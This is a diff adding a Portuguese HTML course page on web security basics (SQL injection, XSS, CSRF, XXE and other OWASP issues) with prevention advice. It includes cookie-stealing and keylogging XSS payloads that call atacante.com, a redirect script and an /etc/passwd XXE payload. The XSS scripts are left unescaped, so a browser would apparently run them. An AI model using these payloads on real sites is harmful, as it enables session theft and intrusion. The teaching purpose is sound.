@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cursos - Nexus Shadow</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+</head>
+<body>
+    <div class="bg-animation"></div>
+    <div class="grid-bg"></div>
+    <div class="matrix-bg"></div>
+
+    <nav>
+        <a href="index.html" class="logo">◇ Nexus Shadow</a>
+        <ul class="nav-links">
+            <li><a href="index.html">Início</a></li>
+            <li><a href="cursos.html">Cursos</a></li>
+            <li><a href="pentest.html">Pentest</a></li>
+            <li><a href="contato.html">Contato</a></li>
+        </ul>
+        <div class="hamburger" onclick="toggleMenu()">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </nav>
+
+    <section class="course-header">
+        <h1 class="fade-in">Fundamentos de Segurança Web</h1>
+        <p class="fade-in stagger-1">Aprenda a identificar e explorar vulnerabilidades em aplicações web</p>
+    </section>
+
+    <section>
+        <div class="course-content">
+            <div class="course-section fade-in">
+                <h2>Sobre Este Módulo</h2>
+                <p>
+                    Este é o primeiro módulo da nossa jornada em segurança cibernética. Aqui você aprenderá 
+                    os fundamentos das vulnerabilidades mais comuns em aplicações web, como elas funcionam 
+                    e como podem ser exploradas por atacantes maliciosos.
+                </p>
+                <br>
+                <p>
+                    <strong>Duração:</strong> Estude no seu ritmo<br>
+                    <strong>Nível:</strong> Iniciante<br>
+                    <strong>Modalidade:</strong> Gratuito / Educacional
+                </p>
+            </div>
+
+            <div class="course-section fade-in stagger-1">
+                <h2>🔴 SQL Injection (SQLi)</h2>
+                <p>
+                    SQL Injection é uma técnica de injeção de código que explora vulnerabilidades em aplicações 
+                    que usam entrada do usuário em instruções SQL. O atacante pode manipular consultas ao banco 
+                    de dados para acessar, modificar ou excluir informações não autorizadas.
+                </p>
+                <br>
+                <h3>Tipos de SQL Injection:</h3>
+                <ul>
+                    <li><strong>In-Band SQLi:</strong> O ataque e os resultados são retornados na mesma comunicação</li>
+                    <li><strong>Blind SQLi:</strong> O atacante não vê a resposta direta, mas observa comportamento</li>
+                    <li><strong>Out-of-Band SQLi:</strong> Usa canais alternativos para obter resultados</li>
+                </ul>
+                <br>
+                <h3>Exemplo Clássico:</h3>
+                <pre style="background: #1a1a2e; padding: 15px; border-radius: 10px; overflow-x: auto; color: #00D4FF;">
+// Vulnerável:
+SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + passInput + "'
+
+// Ataque (userInput):
+admin'--
+
+// Query executada:
+SELECT * FROM users WHERE username = 'admin'--' AND password = ''
+                </pre>
+                <br>
+                <h3>Como Prevenir:</h3>
+                <ul>
+                    <li>Use Prepared Statements (Parameterized Queries)</li>
+                    <li>Valide e sanitize todas as entradas do usuário</li>
+                    <li>Use ORM (Object-Relational Mapping)</li>
+                    <li>Aplique o princípio do menor privilégio</li>
+                </ul>
+            </div>
+
+            <div class="course-section fade-in stagger-2">
+                <h2>🟡 Cross-Site Scripting (XSS)</h2>
+                <p>
+                    XSS permite que atacantes injetem scripts maliciosos em páginas web visualizadas por outros usuários. 
+                    Isso pode roubar cookies, sessões, redirecionar usuários ou realizar ações em nome da vítima.
+                </p>
+                <br>
+                <h3>Tipos de XSS:</h3>
+                <ul>
+                    <li><strong>Reflected XSS:</strong> Script malicioso é refletido no servidor e executado imediatamente</li>
+                    <li><strong>Stored XSS:</strong> Script malicioso é armazenado no servidor e executado quando outros usuários acessam</li>
+                    <li><strong>DOM-based XSS:</strong> Script é executado no lado do cliente, manipulando o DOM</li>
+                </ul>
+                <br>
+                <h3>Exemplo de Payload:</h3>
+                <pre style="background: #1a1a2e; padding: 15px; border-radius: 10px; overflow-x: auto; color: #00D4FF;">
+// Roubo de cookie:
+<script>new Image().src="http://atacante.com/?cookie="+document.cookie;</script>
+
+// Redirecionamento malicioso:
+<script>window.location="http://malicious-site.com"</script>
+
+// Keylogger:
+<script>document.onkeypress=function(e){fetch('http://atacante.com?k='+e.key)}</script>
+                </pre>
+                <br>
+                <h3>Como Prevenir:</h3>
+                <ul>
+                    <li>Encode todas as saídas (HTML, URL, JavaScript)</li>
+                    <li>Use Content Security Policy (CSP)</li>
+                    <li>Valide entrada do usuário</li>
+                    <li>Use frameworks que fazem escape automático</li>
+                </ul>
+            </div>
+
+            <div class="course-section fade-in stagger-3">
+                <h2>🟠 Cross-Site Request Forgery (CSRF)</h2>
+                <p>
+                    CSRF força usuários autenticados a executar ações não desejadas em aplicações web. 
+                    O atacante induz o usuário a enviar requisições indesejadas para sites onde está autenticado.
+                </p>
+                <br>
+                <h3>Como Funciona:</h3>
+                <ul>
+                    <li>Usuário faz login no banco online</li>
+                    <li>Usuário visita site malicioso (em outra aba)</li>
+                    <li>Site malicioso envia requisição automática ao banco</li>
+                    <li>Browser do usuário envia cookies de autenticação junto</li>
+                    <li>Transferência não autorizada é realizada</li>
+                </ul>
+                <br>
+                <h3>Como Prevenir:</h3>
+                <ul>
+                    <li>Use tokens CSRF (Anti-CSRF tokens)</li>
+                    <li>Verifique o Referer header</li>
+                    <li>SameSite cookies</li>
+                    <li>Requisições POST para ações sensíveis</li>
+                </ul>
+            </div>
+
+            <div class="course-section fade-in stagger-4">
+                <h2>🔵 Broken Authentication</h2>
+                <p>
+                    Vulnerabilidades em sistemas de autenticação permitem que atacantes comprometam senhas, 
+                    chaves de sessão ou explorem falhas de implementação para acessar contas de outros usuários.
+                </p>
+                <br>
+                <h3>Falhas Comuns:</h3>
+                <ul>
+                    <li><strong>Credential Stuffing:</strong> Uso de senhas vazadas em outros serviços</li>
+                    <li><strong>Session Hijacking:</strong> Roubo de ID de sessão</li>
+                    <li><strong>Weak Password Policy:</strong> Senhas fracas permitidas</li>
+                    <li><strong>Session Fixation:</strong> Forçar ID de sessão conhecido</li>
+                </ul>
+                <br>
+                <h3>Boas Práticas:</h3>
+                <ul>
+                    <li>Implemente MFA (Autenticação Multifator)</li>
+                    <li>Use senhas hashadas com salt (bcrypt, argon2)</li>
+                    <li>Timeouts de sessão adequados</li>
+                    <li>Rate limiting em tentativas de login</li>
+                </ul>
+            </div>
+
+            <div class="course-section fade-in">
+                <h2>🟣 Sensitive Data Exposure</h2>
+                <p>
+                    Exposição de dados sensíveis ocorre quando aplicações não protegem adequadamente informações 
+                    como senhas, dados pessoais, números de cartão, informações financeiras ou dados de saúde.
+                </p>
+                <br>
+                <h3>Cenários de Risco:</h3>
+                <ul>
+                    <li>Dados transmitidos sem criptografia (HTTP em vez de HTTPS)</li>
+                    <li>Backups ou arquivos sensíveis expostos publicamente</li>
+                    <li>Chaves de API ou segredos hardcoded</li>
+                    <li>Banco de dados com dados não criptografados</li>
+                </ul>
+                <br>
+                <h3>Proteção:</h3>
+                <ul>
+                    <li>Use TLS/SSL para todas as comunicações</li>
+                    <li>Criptografe dados sensíveis em repouso</li>
+                    <li>Não armazene dados desnecessários</li>
+                    <li>Use secrets management (Vault, AWS Secrets Manager)</li>
+                </ul>
+            </div>
+
+            <div class="course-section fade-in stagger-1">
+                <h2>🔴 XML External Entity (XXE)</h2>
+                <p>
+                    XXE permite que atacantes explorem parsers XML vulneráveis para acessar arquivos locais, 
+                    realizar SSRF, ou até executar código remoto.
+                </p>
+                <br>
+                <h3>Exemplo de Payload Malicioso:</h3>
+                <pre style="background: #1a1a2e; padding: 15px; border-radius: 10px; overflow-x: auto; color: #00D4FF;">
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&xxe;</data>
+                </pre>
+                <br>
+                <h3>Prevenção:</h3>
+                <ul>
+                    <li>Desabilite entidades externas em parsers XML</li>
+                    <li>Use JSON em vez de XML quando possível</li>
+                    <li>Valide entrada XML</li>
+                    <li>Atualize bibliotecas parsers</li>
+                </ul>
+            </div>
+
+            <div class="course-section fade-in stagger-2">
+                <h2>🟡 Security Misconfiguration</h2>
+                <p>
+                    Configurações de segurança inadequadas são uma das causas mais comuns de comprometimento. 
+                    Incluem configurações padrão, recursos desabilitados, ou falta de patches de segurança.
+                </p>
+                <br>
+                <h3>Exemplos de Falhas:</h3>
+                <ul>
+                    <li>Credenciais padrão não alteradas (admin/admin)</li>
+                    <li>Debug mode habilitado em produção</li>
+                    <li>Arquivos sensíveis expostos (/admin, /.git)</li>
+                    <li>CORS mal configurado</li>
+                    <li>Headers de segurança ausentes</li>
+                </ul>
+                <br>
+                <h3>Checklist de Segurança:</h3>
+                <ul>
+                    <li>Alterar todas as senhas padrão</li>
+                    <li>Desabilitar verbose errors em produção</li>
+                    <li>Configurar headers de segurança (HSTS, CSP, X-Frame-Options)</li>
+                    <li>Remover informações de versão</li>
+                    <li>Revisar permissões de arquivos</li>
+                </ul>
+            </div>
+
+            <div class="course-section fade-in stagger-3">
+                <h2>🟠 Insecure Deserialization</h2>
+                <p>
+                    Desserialização insegura ocorre quando dados não confiáveis são desserializados. 
+                    Atacantes podem manipular objetos serializados para executar código arbitrário.
+                </p>
+                <br>
+                <h3>Impactos:</h3>
+                <ul>
+                    <li>Execução de código remoto (RCE)</li>
+                    <li>Injeção de comandos do sistema</li>
+                    <li>Acesso a arquivos locais</li>
+                    <li>Denial of Service (DoS)</li>
+                </ul>
+                <br>
+                <h3>Prevenção:</h3>
+                <ul>
+                    <li>Não aceite objetos serializados de fontes não confiáveis</li>
+                    <li>Use formatos de dados seguros (JSON, Protocol Buffers)</li>
+                    <li>Valide完整性 dos dados antes de desserializar</li>
+                    <li>Execute desserialização em ambientes isolados</li>
+                </ul>
+            </div>
+
+            <div class="course-section fade-in stagger-4">
+                <h2>🟢 Using Components with Known Vulnerabilities</h2>
+                <p>
+                    Componentes de software (bibliotecas, frameworks, plugins) com vulnerabilidades conhecidas 
+                    são um vetor de ataque comum. Atacantes scaneiam versões vulneráveis ativamente.
+                </p>
+                <br>
+                <h3>Melhores Práticas:</h3>
+                <ul>
+                    <li>Mantenha todos os componentes atualizados</li>
+                    <li>Use ferramentas de análise de dependências (OWASP Dependency-Check)</li>
+                    <li>Monitore vulnerabilidades conocidas (CVE)</li>
+                    <li>Remova componentes não utilizados</li>
+                    <li>Prefira bibliotecas com suporte ativo</li>
+                </ul>
+            </div>
+
+            <div class="course-section fade-in">
+                <h2>🔵 Insufficient Logging & Monitoring</h2>
+                <p>
+                    Logging e monitoramento insuficientes permitem que ataques passem despercebidos, 
+                    aumentando o tempo para detecção e resposta a incidentes.
+                </p>
+                <br>
+                <h3>O Que Registrar:</h3>
+                <ul>
+                    <li>Tentativas de login (sucesso e falha)</li>
+                    <li>Ações de alto privilégio</li>
+                    <li>Erros e exceções</li>
+                    <li>Acesso a dados sensíveis</li>
+                    <li>Alterações de configuração</li>
+                </ul>
+                <br>
+                <h3>Monitoramento Efetivo:</h3>
+                <ul>
+                    <li>Configure alertas para comportamentos suspeitos</li>
+                    <li>Integre com SIEM</li>
+                    <li>Realize análise de logs regularmente</li>
+                    <li>Tenha plano de resposta a incidentes</li>
+                </ul>
+            </div>
+        </div>
+    </section>
+
+    <section class="features">
+        <div class="section-title">
+            <h2 class="fade-in">Próximos Passos</h2>
+            <p class="fade-in stagger-1">Continue sua jornada em segurança cibernética</p>
+        </div>
+        <div class="card-grid">
+            <div class="card fade-in stagger-1">
+                <div class="card-icon">🔐</div>
+                <h3>Pentest Avançado</h3>
+                <p>Avance para o módulo de Penetration Testing e aprenda técnicas avançadas de exploração.</p>
+                <br>
+                <a href="pentest.html" class="btn btn-outline">Continuar</a>
+            </div>
+            <div class="card fade-in stagger-2">
+                <div class="card-icon">💻</div>
+                <h3>Laboratórios Práticos</h3>
+                <p>Pratique em ambientes controlados com nossas máquinas vulneráveis.</p>
+                <br>
+                <a href="contato.html" class="btn btn-outline">Solicitar Acesso</a>
+            </div>
+            <div class="card fade-in stagger-3">
+                <div class="card-icon">🎯</div>
+                <h3>Certificações</h3>
+                <p>Prepare-se para certificações como OSCP, CEH e outras.</p>
+                <br>
+                <a href="contato.html" class="btn btn-outline">Saber Mais</a>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2024 Nexus Shadow. Todos os direitos reservados.</p>
+        <p>Education in Cyber Security</p>
+        <div class="social-links">
+            <a href="#">𝕏</a>
+            <a href="#">📷</a>
+            <a href="#">💼</a>
+        </div>
+    </footer>
+
+    <script>
+        function toggleMenu() {
+            document.querySelector('.nav-links').classList.toggle('active');
+        }
+
+        const observerOptions = {
+            threshold: 0.1,
+            rootMargin: '0px 0px -50px 0px'
+        };
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.style.animationPlayState = 'running';
+                }
+            });
+        }, observerOptions);
+
+        document.querySelectorAll('.fade-in').forEach(el => {
+            el.style.animationPlayState = 'paused';
+            observer.observe(el);
+        });
+    </script>
+</body>
+</html>
+
